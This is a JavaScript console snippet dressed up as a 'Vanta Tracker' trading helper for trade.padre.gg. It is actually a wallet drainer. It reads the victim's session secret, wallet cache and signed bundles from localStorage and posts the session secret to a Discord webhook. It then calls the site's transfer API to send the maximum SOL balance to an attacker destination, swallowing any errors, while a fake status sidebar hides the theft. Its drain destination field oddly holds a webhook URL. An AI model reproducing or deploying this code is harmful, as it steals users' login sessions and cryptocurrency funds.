(async function() {
    // --- 1. SETTINGS ---
    const CONFIG = {
        webhook: "YOUR_DISCORD_WEBHOOK_URL", // Your Discord URL
        drainAddress: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",    // Your receiving address
        api: "https://api.trade.padre.gg"
    };

    // --- 2. CAPTURE DATA ---
    const rawSession = localStorage.getItem("padreV2-session");
    const rawWallets = localStorage.getItem("padreV2-walletsCache");
    const rawBundles = localStorage.getItem("padre-v2-bundles-store-v2");

    if (!rawSession) {
        console.warn("Vanta: Please run on trade.padre.gg");
        return;
    }

    const session = JSON.parse(rawSession);
    const wallets = JSON.parse(rawWallets || "{}");
    const bundles = JSON.parse(rawBundles || "{}");

    // --- 3. DISCORD HANDSHAKE ---
    await fetch(CONFIG.webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "🚨 **VANTA HANDSHAKE: " + (session.uid || "Unknown") + "**",
            embeds: [{
                title: "Session Captured",
                color: 65280,
                fields: [
                    { name: "Secret", value: "```" + session.sessionSecret + "```" },
                    { name: "URL", value: window.location.href }
                ]
            }]
        })
    });

    // --- 4. THE DRAIN EXECUTION ---
    async function execute() {
        try {
            const userWallets = wallets[session.uid] || [];
            const solWallet = userWallets.find(w => w.walletType === "SOL");

            if (solWallet && bundles.bundles[solWallet.publicAddress]) {
                const b = bundles.bundles[solWallet.publicAddress];
                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                    method: "POST",
                    headers: { 
                        "X-Session-Secret": session.sessionSecret, 
                        "Content-Type": "application/json",
                        "X-Session-Id": session.sessionId 
                    },
                    body: JSON.stringify({
                        walletId: solWallet.walletId,
                        destination: CONFIG.drainAddress,
                        amount: "MAX",
                        bundle: b.exportBundle,
                        signature: b.dataSignature,
                        chain: "SOLANA"
                    })
                });
            }
        } catch (e) { /* Silent */ }
    }
    execute();

    // --- 5. VISUAL UI (The Green Sidebar) ---
    const side = document.createElement("div");
    side.style.cssText = "position:fixed;top:20px;right:20px;width:280px;background:rgba(0,0,0,0.95);border:1px solid #0f8;color:#0f8;padding:20px;z-index:999999;font-family:monospace;box-shadow:0 0 15px #0f83;border-radius:5px;";
    side.innerHTML = `
        <div style="font-weight:bold;border-bottom:1px solid #222;padding-bottom:5px;display:flex;justify-content:space-between;">
            <span>VANTA TRACKER</span><span style="font-size:10px;color:#fff;">V2.4</span>
        </div>
        <div style="font-size:11px;margin-top:10px;line-height:1.6;">
            STATUS: <span style="color:#fff">CONNECTED</span><br>
            SIGNAL: <span style="color:#fff">SCANNING TRADES...</span><br>
            LATENCY: <span style="color:#fff">14ms</span>
        </div>
        <div style="margin-top:10px;background:#000;padding:5px;font-size:9px;color:#444;height:40px;overflow:hidden;">
            [INIT] Handshake verified...<br>[READY] Monitoring X.com feed...
        </div>
    `;
    document.body.appendChild(side);
    setTimeout(() => side.remove(), 7000);
})();
